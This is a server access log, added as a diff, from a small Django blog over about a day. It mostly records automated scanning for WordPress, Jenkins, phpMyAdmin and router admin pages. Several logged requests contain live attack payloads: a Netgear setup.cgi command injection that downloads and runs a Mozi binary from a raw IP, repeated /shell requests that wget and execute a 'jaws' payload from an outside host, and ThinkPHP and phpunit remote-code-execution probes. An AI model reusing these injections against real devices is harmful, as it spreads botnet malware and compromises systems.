+Not Found: /cms/wp-includes/wlwmanifest.xml
+[20/Jan/2021 14:03:19] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+[20/Jan/2021 14:16:09] "GET / HTTP/1.1" 200 2027
+Not Found: /boaform/admin/formLogin
+[20/Jan/2021 14:19:18] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 2307
+Not Found: /setup.cgi
+[20/Jan/2021 14:34:48] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.222.165.141:37968/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2405
+Not Found: /api/jsonws/invoke
+[20/Jan/2021 15:13:57] "POST /api/jsonws/invoke HTTP/1.1" 404 2267
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 15:13:57] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2365
+Not Found: /solr/admin/info/system
+[20/Jan/2021 15:13:58] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2289
+[20/Jan/2021 15:13:58] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 2027
+Not Found: /index.php
+[20/Jan/2021 15:13:59] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 2361
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[20/Jan/2021 15:13:59] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2366
+[20/Jan/2021 15:13:59] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2027
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[20/Jan/2021 15:14:00] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 2350
+Not Found: /console/
+[20/Jan/2021 15:14:00] "GET /console/ HTTP/1.1" 404 2239
+Not Found: /Autodiscover/Autodiscover.xml
+[20/Jan/2021 15:14:02] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2303
+[20/Jan/2021 15:24:19] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 15:24:19] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:20] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[20/Jan/2021 15:24:20] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[20/Jan/2021 15:24:21] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:21] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:22] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:22] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:22] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:23] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:23] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2020/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:24] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:24] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:25] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:25] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:26] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:26] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:26] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:27] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[20/Jan/2021 15:24:27] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[20/Jan/2021 15:27:09] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 16:16:31] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 16:37:10] "HEAD / HTTP/1.0" 200 2027
+Not Found: /index.php
+[20/Jan/2021 16:46:21] "GET /index.php HTTP/1.1" 404 2239
+Not Found: /phpmyadmin/index.php
+[20/Jan/2021 16:46:21] "GET /phpmyadmin/index.php HTTP/1.1" 404 2272
+[20/Jan/2021 16:54:51] "GET / HTTP/1.1" 200 2027
+Not Found: /config/getuser
+[20/Jan/2021 17:05:41] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[20/Jan/2021 17:09:10] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 17:17:42] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 17:26:03] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1')
+[20/Jan/2021 17:26:03] "GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+Not Found: /manager/html/
+[20/Jan/2021 17:28:50] "GET /manager/html/ HTTP/1.1" 404 2254
+[20/Jan/2021 18:20:13] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 18:20:14] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:15] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[20/Jan/2021 18:20:15] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[20/Jan/2021 18:20:16] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:16] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:17] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:18] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:18] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:19] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:19] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:20] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:20] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:21] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:21] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:22] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[20/Jan/2021 18:20:23] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[20/Jan/2021 18:44:12] "HEAD / HTTP/1.0" 200 2027
+[20/Jan/2021 19:04:23] "HEAD / HTTP/1.0" 200 2027
+[20/Jan/2021 19:08:26] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 19:08:30] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 19:08:30] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[20/Jan/2021 19:08:30] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[20/Jan/2021 19:08:30] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[20/Jan/2021 19:08:30] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[20/Jan/2021 19:13:17] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 19:17:43] "GET / HTTP/1.1" 200 2027
+Not Found: /hudson
+[20/Jan/2021 19:43:46] "GET /hudson HTTP/1.1" 404 2230
+[20/Jan/2021 20:42:34] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 21:32:26] "GET / HTTP/1.1" 200 2027
+Not Found: /login
+[20/Jan/2021 21:44:52] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[20/Jan/2021 21:44:52] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[20/Jan/2021 21:44:52] "GET /manager/html HTTP/1.0" 404 2247
+[20/Jan/2021 21:48:16] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 22:04:07] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1')
+[20/Jan/2021 22:04:07] "GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+[20/Jan/2021 22:17:50] "GET / HTTP/1.1" 200 2027
+Not Found: /manager/html/
+[20/Jan/2021 22:21:38] "GET /manager/html/ HTTP/1.0" 404 2250
+Not Found: /login
+[20/Jan/2021 22:26:13] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[20/Jan/2021 22:26:14] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[20/Jan/2021 22:26:15] "GET /manager/html HTTP/1.0" 404 2247
+[20/Jan/2021 23:27:40] "GET / HTTP/1.1" 200 2027
+[20/Jan/2021 23:27:40] "GET /static/css/blog_base_total.css HTTP/1.1" 304 0
+[20/Jan/2021 23:27:40] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[20/Jan/2021 23:27:40] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[20/Jan/2021 23:27:40] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[20/Jan/2021 23:29:22] "GET /auth/login HTTP/1.1" 200 2747
+[20/Jan/2021 23:29:23] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[20/Jan/2021 23:29:25] "POST /auth/login HTTP/1.1" 302 0
+[20/Jan/2021 23:29:25] "GET / HTTP/1.1" 200 2026
+[20/Jan/2021 23:29:27] "GET / HTTP/1.1" 200 2026
+[20/Jan/2021 23:29:28] "GET / HTTP/1.1" 200 2026
+[20/Jan/2021 23:29:29] "GET /auth/logout HTTP/1.1" 302 0
+[20/Jan/2021 23:29:29] "GET /auth/login HTTP/1.1" 200 2747
+[20/Jan/2021 23:29:30] "GET /auth/signup HTTP/1.1" 200 5517
+[20/Jan/2021 23:29:30] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+Not Found: /login
+[21/Jan/2021 00:13:00] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 00:13:01] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 00:13:01] "GET /manager/html HTTP/1.0" 404 2247
+[21/Jan/2021 00:20:28] "GET / HTTP/1.1" 200 2027
+Not Found: /login
+[21/Jan/2021 00:45:29] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 00:45:29] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 00:45:30] "GET /manager/html HTTP/1.0" 404 2247
+[21/Jan/2021 00:51:38] "GET / HTTP/1.1" 200 2027
+Not Found: /ads.txt
+[21/Jan/2021 00:51:38] "GET /ads.txt HTTP/1.1" 404 2230
+[21/Jan/2021 01:06:35] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 01:11:10] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 01:11:11] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:11] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[21/Jan/2021 01:11:12] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[21/Jan/2021 01:11:12] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:12] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:13] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:13] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:14] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:14] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:15] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:15] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:15] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:16] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:16] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:17] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[21/Jan/2021 01:11:17] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[21/Jan/2021 01:27:50] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 01:40:30] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 01:40:31] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 01:40:42] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 01:40:43] "GET /auth/login HTTP/1.1" 200 2747
+[21/Jan/2021 01:40:46] "POST /auth/login HTTP/1.1" 302 0
+[21/Jan/2021 01:40:46] "GET / HTTP/1.1" 200 2026
+[21/Jan/2021 01:40:47] "GET /auth/logout HTTP/1.1" 302 0
+[21/Jan/2021 01:40:47] "GET /auth/login HTTP/1.1" 200 2747
+[21/Jan/2021 02:16:11] "GET /auth/login HTTP/1.1" 200 2747
+[21/Jan/2021 02:16:11] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[21/Jan/2021 02:16:13] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 02:16:14] "GET /auth/signup HTTP/1.1" 200 5517
+[21/Jan/2021 02:16:20] "GET /admin HTTP/1.1" 301 0
+[21/Jan/2021 02:16:20] "GET /admin/ HTTP/1.1" 302 0
+[21/Jan/2021 02:16:20] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[21/Jan/2021 02:16:20] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[21/Jan/2021 02:16:20] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[21/Jan/2021 02:16:21] "GET /static/admin/css/login.css HTTP/1.1" 200 1185
+[21/Jan/2021 02:16:21] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[21/Jan/2021 02:16:21] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[21/Jan/2021 02:16:21] "GET /admin/ HTTP/1.1" 302 0
+[21/Jan/2021 02:16:21] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[21/Jan/2021 02:16:21] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[21/Jan/2021 02:16:21] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[21/Jan/2021 02:16:21] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[21/Jan/2021 02:16:21] "GET /favicon.ico HTTP/1.1" 404 2244
+[21/Jan/2021 02:16:25] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[21/Jan/2021 02:16:25] "GET /admin/ HTTP/1.1" 200 5170
+[21/Jan/2021 02:16:25] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[21/Jan/2021 02:16:25] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[21/Jan/2021 02:16:25] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[21/Jan/2021 02:16:25] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[21/Jan/2021 02:16:25] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[21/Jan/2021 02:16:26] "GET /admin/accounts/account/ HTTP/1.1" 200 6502
+[21/Jan/2021 02:16:27] "GET /admin/accounts/account/ HTTP/1.1" 200 6502
+[21/Jan/2021 02:16:27] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6284
+[21/Jan/2021 02:16:27] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[21/Jan/2021 02:16:27] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[21/Jan/2021 02:16:27] "GET /static/admin/js/core.js HTTP/1.1" 200 5418
+[21/Jan/2021 02:16:27] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6078
+[21/Jan/2021 02:16:27] "GET /static/admin/js/actions.js HTTP/1.1" 200 6783
+[21/Jan/2021 02:16:27] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8632
+[21/Jan/2021 02:16:27] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 287630
+[21/Jan/2021 02:16:27] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[21/Jan/2021 02:16:27] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[21/Jan/2021 02:16:27] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[21/Jan/2021 02:16:29] "GET /admin/accounts/account/8/change/ HTTP/1.1" 200 20284
+[21/Jan/2021 02:16:29] "GET /admin/accounts/account/8/change/ HTTP/1.1" 200 20284
+[21/Jan/2021 02:16:29] "GET /static/admin/css/forms.css HTTP/1.1" 200 8399
+[21/Jan/2021 02:16:29] "GET /static/admin/js/calendar.js HTTP/1.1" 200 7788
+[21/Jan/2021 02:16:29] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19750
+[21/Jan/2021 02:16:29] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[21/Jan/2021 02:16:29] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10592
+[21/Jan/2021 02:16:29] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[21/Jan/2021 02:16:29] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[21/Jan/2021 02:16:29] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[21/Jan/2021 02:16:29] "GET /static/admin/img/icon-clock.svg HTTP/1.1" 200 677
+[21/Jan/2021 02:22:21] "GET / HTTP/1.0" 200 2027
+[21/Jan/2021 02:23:09] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 02:46:08] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1')
+[21/Jan/2021 02:46:08] "GET /shell?cd+/tmp;rm+-rf+*;wget+ debes.venus.lol/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+[21/Jan/2021 02:51:08] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 03:22:07] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 03:26:18] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 03:48:26] "GET / HTTP/1.1" 200 2027
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:43:15] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2320
+Not Found: /site/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:44:21] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2305
+Not Found: /old/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:44:37] "GET /old/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2302
+Not Found: /backup/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:44:58] "GET /backup/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2311
+Not Found: /en/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:46:04] "GET /en/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2299
+Not Found: /demo/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:46:20] "GET /demo/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2305
+Not Found: /web/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:46:58] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2302
+Not Found: /dev/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:47:18] "GET /dev/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2302
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:48:00] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2302
+Not Found: /www/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:48:15] "GET /www/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2302
+Not Found: /staging/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:48:32] "GET /staging/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2314
+Not Found: /news/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:49:39] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2305
+Not Found: /main/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:49:58] "GET /main/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2305
+Not Found: /newsite/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:50:14] "GET /newsite/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2314
+Not Found: /v2/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:50:55] "GET /v2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2299
+Not Found: /oldsite/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:51:10] "GET /oldsite/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2314
+Not Found: /oldsite/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:51:36] "GET /oldsite/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2314
+Not Found: /portal/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:52:44] "GET /portal/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2311
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:52:57] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2305
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:53:42] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2305
+Not Found: /v1/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:54:23] "GET /v1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2299
+Not Found: /1/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:55:04] "GET /1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2296
+Not Found: /store/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:55:19] "GET /store/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2308
+Not Found: /store/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:55:44] "GET /store/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2308
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:56:26] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2302
+Not Found: /blogs/wp-includes/wlwmanifest.xml
+[21/Jan/2021 04:57:08] "GET /blogs/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2308
+[21/Jan/2021 04:59:39] "GET / HTTP/1.1" 200 2026
+[21/Jan/2021 04:59:39] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[21/Jan/2021 04:59:39] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[21/Jan/2021 04:59:40] "GET / HTTP/1.1" 200 2026
+[21/Jan/2021 04:59:42] "GET /auth/logout HTTP/1.1" 302 0
+[21/Jan/2021 04:59:42] "GET /auth/login HTTP/1.1" 200 2747
+[21/Jan/2021 04:59:42] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[21/Jan/2021 05:01:42] "HEAD / HTTP/1.0" 200 2027
+Not Found: /system_api.php
+[21/Jan/2021 05:01:43] "GET /system_api.php HTTP/1.1" 404 2254
+Not Found: /c/version.js
+[21/Jan/2021 05:01:44] "GET /c/version.js HTTP/1.1" 404 2248
+Not Found: /streaming/clients_live.php
+[21/Jan/2021 05:01:45] "GET /streaming/clients_live.php HTTP/1.1" 404 2290
+Not Found: /stalker_portal/c/version.js
+[21/Jan/2021 05:01:45] "GET /stalker_portal/c/version.js HTTP/1.1" 404 2293
+Not Found: /client_area/
+[21/Jan/2021 05:01:46] "GET /client_area/ HTTP/1.1" 404 2248
+Not Found: /stalker_portal/c/
+[21/Jan/2021 05:01:47] "GET /stalker_portal/c/ HTTP/1.1" 404 2263
+Not Found: /phpmyadmin/
+[21/Jan/2021 05:07:42] "GET /phpmyadmin/ HTTP/1.1" 404 2245
+----------------------------------------
+Exception happened during processing of request from ('83.224.145.233', 31549)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /login
+[21/Jan/2021 05:16:07] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 05:16:07] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 05:16:07] "GET /manager/html HTTP/1.0" 404 2247
+Not Found: /login
+[21/Jan/2021 05:24:43] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 05:24:43] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 05:24:43] "GET /manager/html HTTP/1.0" 404 2247
+Not Found: /config/getuser
+[21/Jan/2021 05:31:26] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[21/Jan/2021 05:39:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[21/Jan/2021 05:39:55] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /boaform/admin/formLogin
+[21/Jan/2021 05:53:11] "POST /boaform/admin/formLogin HTTP/1.1" 404 2285
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/Jan/2021 06:21:25] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 59641)
